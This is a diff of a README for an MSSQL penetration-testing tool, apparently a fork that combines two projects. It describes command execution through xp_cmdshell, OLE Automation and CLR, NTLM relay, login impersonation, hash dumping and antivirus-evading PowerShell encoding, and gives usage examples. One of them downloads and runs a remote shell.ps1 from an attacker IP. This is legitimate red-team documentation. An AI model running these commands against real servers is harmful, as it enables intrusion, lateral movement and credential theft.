@@ -1,120 +1,219 @@
 <div align="center">
-  <a href="https://github.com/SySS-Research/MAT">
+  <a href="https://github.com/johto89/mat">
     <img src="images/logo.jpeg" height="300">
   </a>
 
-  <h1>M.A.T - A swiss army knife for pentesting MSSQL servers</h1>
+  <h1>M.A.T - MSSQL Attack Tool (Integrated Edition)</h1>
 </div>
 
 ## Description
 
-The MSSQL ATTACK TOOL (M.A.T) was developed at SySS internally in a Research & Development project. The tool, programmed in C#, allows for the fast discovery and exploitation of vulnerabilities in MSSQL servers.
+The MSSQL ATTACK TOOL (M.A.T) is a C# tool for fast discovery and exploitation of vulnerabilities in MSSQL servers. Originally developed at SySS GmbH, this integrated edition merges capabilities from [SharpSQLPwn](https://github.com/lefayjey/SharpSQLPwn) into a single binary for comprehensive MSSQL lateral movement during penetration testing and red team engagements.
 
-## OVERVIEW OF THE FUNCTIONALITY
-- **Performs automatic checks and identifies vulnerabilities**
-- **Enables login via Windows Integrated Authentication as well as SQL Authentication**
-- **Quickly activates XP_cmdshell if the permission exists (locally as well as on Linked Servers)**
-- **Convenient execution of system commands via XP_cmdshell (locally as well as on single/double Linked Servers)**
-- **Convenient execution of SQL commands (locally as well as on Linked Servers)**
-- **Fast triggering of NTLM requests via XP_dirtree**
-- **Custom Stored Procedure - for executing OS commands (locally)**
-- **Automatically checks and enables RPC OUT (if RPC OUT is disabled for Linked Servers, stored procedures such as xp_cmdshell on Linked Servers are not usable)**
-- **Automatic dumping of MSSQL user hashes**
+## Features
+
+- **Reconnaissance** - Automatic checks: login info, group memberships, linked servers, impersonation privileges, SQL logins enumeration
+- **Three command execution techniques:**
+  - `xp_cmdshell` (local + linked servers, single/double/triple link)
+  - `sp_OACreate` / OLE Automation Procedures (local + linked servers, blind execution)
+  - CLR Assembly custom stored procedure (local)
+- **Windows Integrated, SQL, and Azure AD Authentication**
+- **PowerShell base64 encoding** (`-enc`) for evasion
+- **NTLM relay** via `xp_dirtree` UNC path injection (local + linked servers)
+- **User impersonation** (`EXECUTE AS LOGIN`)
+- **SQL shell** - Execute arbitrary SQL queries (local + linked servers)
+- **Custom query on linked servers** via `OPENQUERY`
+- **Linked server multi-hop** - 1-hop, 2-hop (double link), 3-hop recon and command execution
+- **RPC OUT management** - Automatic check and enable for linked server operations
+- **Hash dumping** - Dump MSSQL user hashes (requires sysadmin)
+- **Post-execution cleanup** - Automatically disables enabled features (xp_cmdshell, OLE Automation, CLR) after use (can be skipped with `--no-cleanup`)
 
 ## Compilation
-For the compilation, Visual Studio was used. Also, the NuGet packages "CommandLineParser.2.9.1" and "Costura.Fody" are required. Alternatively, feel free to use the executable in the release.
 
-## USAGE
+Visual Studio with .NET Framework 4.7.2. Required NuGet packages:
+- `CommandLineParser 2.9.1`
+- `Costura.Fody` (for single-file executable)
+
+Or use the pre-built executable from Releases.
+
+## Usage
+
 ```
-Example: MAT.exe [options]
-Example: MAT.exe --server localhost -u sqlusername -p sqlpassword --os-command "whoami"
-```
-
-If the executable file is executed without credentials (no option "-u:" or "-p:"), it will by default attempt to log in using Windows Integrated Authentication(current logged in Windows user). 
-
-```
-Options:
-
--s, --server           Required. SQL server
--u, --user             SQL user
--p, --password         SQL password
--d, --database         Database name (default: 'master')
--r, --relay            Trigger an NTLM-relay to the given IP via XP_DIRTREE
--i, --impersonate      Impersonate the specified SQL user
---dumphashes           Dump MSSQL user hashes if the current user has admin permissions
--l, --linked-server    Linked SQL server
--e                     Enable XP_CMD Shell locally '-e' or on linked server '-e LINKEDSERVER'
---os-command           OS command to execute on selected target system
---sql-command          SQL command to execute on selected target system
---double-link          Execute OS command via XP_CMD shell using double link
---stoprox              Execute OS command via custom assembly stored procedure
---help                 Display this help screen.
---version              Display version information.
+MAT.exe [options]
 ```
 
-## EXAMPLE SCENARIO
-During a penetration test, the user COM1\user is compromised. A local MSSQL Server instance is identified on the local server. Instead of manually connecting to the instance with various pentesting tools, the MSSQL ATTACK TOOL is used. 
+If no `-u` / `-p` is provided, Windows Integrated Authentication is used by default.
+
+### Options
+
+```
+  -s, --server           Required. SQL server hostname or IP
+  -u, --user             SQL user (for SQL or Azure authentication)
+  -p, --password         SQL password
+  -d, --database         Database name (default: 'master')
+  -l, --linked-server    Target linked SQL server
+  -i, --impersonate      Impersonate the specified SQL login
+  -r, --relay            Trigger NTLM relay to attacker IP via xp_dirtree (works with -l for linked server)
+  -e                     Enable xp_cmdshell locally, or on linked server with -l
+  --os-command           OS command to execute on target
+  --sql-command          SQL command to execute on target
+  --double-link          Execute OS command via double link (value = command)
+  --stoprox              Execute OS command via CLR stored procedure (legacy, same as --cmdtech 3)
+  --dumphashes           Dump MSSQL user hashes (requires sysadmin)
+  --cmdtech              Execution technique: 1=xp_cmdshell (default), 2=sp_OACreate, 3=CLR assembly
+  --encode-ps            Encode command as base64 PowerShell (-enc) for AV evasion
+  --azure-domain         Azure AD domain (enables Azure auth, requires -u and -p)
+  --no-cleanup           Skip post-execution cleanup (don't disable features after use)
+  --linked-query         Execute custom SQL query on linked server via OPENQUERY
+  --help                 Display help screen
+  --version              Display version information
+```
+
+## Examples
+
+### Basic recon (Windows auth)
+```
+MAT.exe --server localhost
+```
+
+### SQL authentication
+```
+MAT.exe --server 10.10.10.5 -u sqladmin -p P@ssw0rd
+```
+
+### Azure AD authentication
+```
+MAT.exe --server azuresql.database.windows.net --azure-domain corp.com -u admin -p P@ssw0rd
+```
+
+### OS command execution (xp_cmdshell - default)
+```
+MAT.exe --server localhost --os-command "whoami"
+```
+
+### OS command via sp_OACreate (blind, no output)
+```
+MAT.exe --server localhost --os-command "whoami" --cmdtech 2
+```
+
+### OS command via CLR Assembly
+```
+MAT.exe --server localhost --os-command "whoami" --cmdtech 3
+# or legacy syntax:
+MAT.exe --server localhost --stoprox "whoami"
+```
+
+### Command with PowerShell base64 encoding
+```
+MAT.exe --server localhost --os-command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')" --encode-ps
+```
+
+### Impersonate user then execute
+```
+MAT.exe --server localhost --impersonate sa --os-command "whoami"
+```
+
+### NTLM relay (local)
+```
+MAT.exe --server localhost --relay 10.10.10.10
+```
+
+### NTLM relay on linked server
+```
+MAT.exe --server localhost -l LINKED01 --relay 10.10.10.10
+```
+
+### Execute OS command on linked server
+```
+MAT.exe --server localhost -l LINKED01 --os-command "whoami"
+```
+
+### Execute OS command on linked server via sp_OACreate
+```
+MAT.exe --server localhost -l LINKED01 --os-command "whoami" --cmdtech 2
+```
+
+### Double link command execution
+```
+MAT.exe --server localhost -l LINKED01 --double-link "whoami"
+```
+
+### SQL shell (local)
+```
+MAT.exe --server localhost --sql-command "SELECT name FROM sys.databases"
+```
+
+### SQL shell on linked server
+```
+MAT.exe --server localhost -l LINKED01 --sql-command "SELECT SYSTEM_USER"
+```
+
+### Custom query on linked server via OPENQUERY
+```
+MAT.exe --server localhost -l LINKED01 --linked-query "SELECT name FROM sys.databases"
+```
+
+### Skip cleanup after execution
+```
+MAT.exe --server localhost --os-command "whoami" --no-cleanup
+```
+
+### Dump MSSQL user hashes
+```
+MAT.exe --server localhost --dumphashes
+```
+
+## Command Execution Techniques
+
+| Technique | `--cmdtech` | Output | Local | Linked | Description |
+|-----------|:-----------:|:------:|:-----:|:------:|-------------|
+| xp_cmdshell | 1 (default) | Yes | Yes | Yes | Standard, returns command output |
+| sp_OACreate | 2 | No (blind) | Yes | Yes | OLE Automation, no output returned |
+| CLR Assembly | 3 | Yes | Yes | No | Custom .NET stored procedure |
+
+## Scenario Walkthrough
+
+During a penetration test, the user `COM1\user` is compromised. A local MSSQL Server instance is identified. The MSSQL ATTACK TOOL is used:
 
 ```
 MAT.exe --server localhost
 ```
 
-The tool indicates that the compromised Windows user can log in to the SQL Server "COM1" (Windows Integrated Authentication - no need to enter username/password). The tool provides the following output:
-
+The tool logs in via Windows Integrated Authentication and outputs recon results:
 
 ![Bild1](./images/example1.png)
 
+The user is in the "sysadmin" group. Enable xp_cmdshell and execute commands:
 
-The user is in the "sysadmin" group. This allows the user to activate the XP_CMD shell and execute system commands or list SQL user logins (which will be important later).
-
-After the XP_cmdshell has been activated (MAT.exe --server localhost -e), system commands can be executed subsequently (MAT.exe --server localhost --os-command "whoami").
-
-The usage of the parameter '--os-command' without using the additional parameter '--linked-server' tells the tool to execute the command locally, on the entry SQL Server (COM1).
+```
+MAT.exe --server localhost -e
+MAT.exe --server localhost --os-command "whoami"
+```
 
 ![Bild2](./images/example2.png)
 
-
-In the next step, it can be tested whether the user COM1\user can be used to access a Linked Server. The following Linked Servers were previously identified by the MSSQL ATTACK TOOL:
+Linked servers are identified:
 
 ![Bild3](./images/example3.png)
 
-
-When querying Linked Servers on the SQL Server, the server itself (in this case COM1) is always listed as well. The actual Linked Server here is "COM2". The direct attempt to use the compromised user to execute SQL commands on this Linked Server fails (the MSSQL Tool performs these checks automatically).
-
-![Bild4](./images/example4.png)
-
-This is because there is no login mapping for the current user on COM1 (see diagram below: SQL users and permissions). The login mapping determines which user from SQL Server COM1 is associated with which user from COM2.
-
-Therefore, it is important to know which users exist on COM1 in order to test whether a login mapping exists for any of these users (if the permissions are high enough, it is possible to directly check this in the linked server object "COM2" (on COM1) via SQL Management Studio). Previously, the MSSQL ATTACK TOOL detected the following user logins:
-
-
-```
-userx
-user1
-adminuser
-```
-
-With the "sysadmin" permission, the user com1\user can also impersonate SQL users.
-
-Thus, an attempt can be made to impersonate the user "userx." By referring to the diagram with users/permissions (at the bottom), it becomes apparent that the impersonated user "userx" can execute SQL commands on COM2 as "usery." It is important to note that all actions performed after impersonation occur as the impersonated user. The following command was used:
-
+Test lateral movement to linked server COM2. If direct access fails, impersonate another SQL login:
 
 ```
 MAT.exe --server localhost --impersonate userx
 ```
 
-
-The use of the tool yields the following result:
-
 ![Bild5](./images/example5.png)
 
-In this demo scenario, the tool is not only capable of executing OS-commands locally or on the Linked Server COM2 (via 1 link) but can also use the SQL Server COM1 as a Linked Server from there (via 2 links). In a Triple Link scenario, COM1 would first connect to COM2 via a link, then back to COM1, and then again to COM2 via a link. The indication "Pwn3d!" indicates that the mapped user on the Linked Server is in the "sysadmin" group and therefore has full control over the SQL Server.
-
-The following illustration shows the existing users of each MSSQL server along with their mappings.
+The tool supports multi-hop scenarios (1-hop, 2-hop, 3-hop) through linked servers. "Pwn3d!" indicates sysadmin access on the target.
 
 ![Bild6](./images/example6.png)
 
-## WRAPPING UP
-After using the MSSQL ATTACK TOOL you should have a pretty good idea of the main security issues on your MSSQL Servers and its permissions. If you are a pentester or a red teamer, you could quickly find some misconfigurations to abuse for local privilege escalation or for lateral movement to a linked server. 
+## Credits
 
-By adopting a proactive approach to security and leveraging tools like the MSSQL ATTACK TOOL, you can strengthen your organization's resilience to cyber threats and ensure the integrity and confidentiality of your data assets.
+- Original MAT: [SySS-Research](https://github.com/SySS-Research/MAT) (Marvin Ramsperger, SySS GmbH)
+- SharpSQLPwn techniques: [lefayjey](https://github.com/lefayjey/SharpSQLPwn)
+- Integration: [johto89](https://github.com/johto89)
+
+## License
+
+See [LICENSE.txt](LICENSE.txt)
